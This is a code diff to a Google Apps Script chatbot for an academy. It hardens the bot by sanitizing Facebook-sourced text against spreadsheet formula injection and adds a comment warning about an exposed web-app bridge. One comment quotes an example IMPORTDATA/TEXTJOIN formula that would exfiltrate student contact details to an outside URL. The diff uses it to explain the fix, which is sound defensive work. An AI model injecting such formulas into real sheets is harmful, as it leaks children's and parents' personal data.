@@ -80,7 +80,14 @@ function doPost(e) {
   }
 }
 
-/* Meta 메신저 웹훅 등록 시의 검증 요청(hub.challenge) 응답. 매니챗만 쓸 거면 안 쓰인다. */
+/* Meta 메신저 웹훅 등록 시의 검증 요청(hub.challenge) 응답. 매니챗만 쓸 거면 안 쓰인다.
+ *
+ * ⛔ [2026-08-03] 여기에 HtmlService를 반환하는 분기를 **넣지 말 것.**
+ *   이 웹앱은 ANYONE_ANONYMOUS + USER_DEPLOYING이라, doGet이 HtmlService 페이지를 한 번이라도 돌려주면
+ *   받은 사람이 google.script.run으로 이 프로젝트의 밑줄 없는 전역 함수 전부(실측 171개)를 원장 권한으로 부를 수 있다
+ *   — previewOneReportCard(학생 리포트카드 공개 URL)·notifyParents(학부모 메일 발송)까지 전부 그 위에 있다.
+ *   회사 두뇌 강사 화면이 정확히 이 이유로 배포 직전 철회됐다(경위·되살리는 조건 = `_보류_두뇌_웹화면.js` 머리말).
+ *   ContentService 텍스트 응답은 이 브릿지를 만들지 않으므로 안전하다 — 아래 두 경로가 그것이다. */
 function doGet(e) {
   const p = (e && e.parameter) || {};
   const 검증 = PropertiesService.getScriptProperties().getProperty('상담AI_검증토큰');
@@ -238,12 +245,21 @@ function 상담_이력_(세션) {
   return msgs;
 }
 
+/* 시트 셀에 남의 글을 넣기 전에 반드시 통과시킨다 — `=`로 시작하는 문자열은 시트가 **수식으로 실행**한다.
+ * 이 봇은 페이스북에서 온 임의의 텍스트를 받아 상담로그·leads에 쓰고, 그 시트에는 profiles(학생 연락처·보호자)가 함께 있다.
+ * 방치하면 `=IMPORTDATA("...?d="&TEXTJOIN(",",1,profiles!B2:B60))` 한 줄로 학생 개인정보가 외부로 나간다
+ * — 사람이 셀을 클릭할 필요도 없다(시트가 스스로 평가한다). 아포스트로피 접두는 표시값을 바꾸지 않는다. */
+function 셀안전_(v) {
+  const s = String(v == null ? '' : v);
+  return /^[=+\-@\t\r]/.test(s) ? ("'" + s) : s;
+}
+
 function 상담_기록_(세션, 발신, 내용, 인계, usage, 비고) {
   const ss = SpreadsheetApp.getActiveSpreadsheet();
   const sh = ensureSheet(ss, '상담로그', 상담AI_로그헤더);
   const u = usage || {};
-  sh.appendRow([new Date(), String(세션), 발신, String(내용).slice(0, 2000), 인계 ? 'Y' : '',
-    u.input_tokens || '', u.cache_read_input_tokens || '', u.output_tokens || '', 비고 || '']);
+  sh.appendRow([new Date(), 셀안전_(세션), 발신, 셀안전_(String(내용).slice(0, 2000)), 인계 ? 'Y' : '',
+    u.input_tokens || '', u.cache_read_input_tokens || '', u.output_tokens || '', 셀안전_(비고 || '')]);
 }
 
 // 이름 또는 연락처가 잡히면 leads에 적재. 같은 세션은 한 번만(중복 리드 방지)
@@ -256,7 +272,8 @@ function 상담_리드적재_(세션, d) {
     if (memo.some(r => String(r[0]).indexOf(표식) >= 0)) return;
   }
   const 메모 = 표식 + ' ' + [d.lead_child_age ? '자녀 ' + d.lead_child_age : '', d.lead_topic || ''].filter(String).join(' · ');
-  ld.appendRow([new Date(), d.lead_name || '(이름 미확인)', d.lead_contact || '', '페이스북', '', '', '', '', '', '', 메모, '상담AI']);
+  // 이름·연락처는 학부모가 보낸 원문이 모델을 거쳐 온 것이라 그대로 셀에 넣으면 수식이 될 수 있다(셀안전_ 주석 참조)
+  ld.appendRow([new Date(), 셀안전_(d.lead_name || '(이름 미확인)'), 셀안전_(d.lead_contact || ''), '페이스북', '', '', '', '', '', '', 셀안전_(메모), '상담AI']);
   adminMail('[SYNK] 💬 상담AI 리드 1건', '이름: ' + (d.lead_name || '-') + '\n연락처: ' + (d.lead_contact || '-') +
     '\n자녀: ' + (d.lead_child_age || '-') + '\n관심: ' + (d.lead_topic || '-') + '\n\nleads 시트에 적재했습니다.');
 }
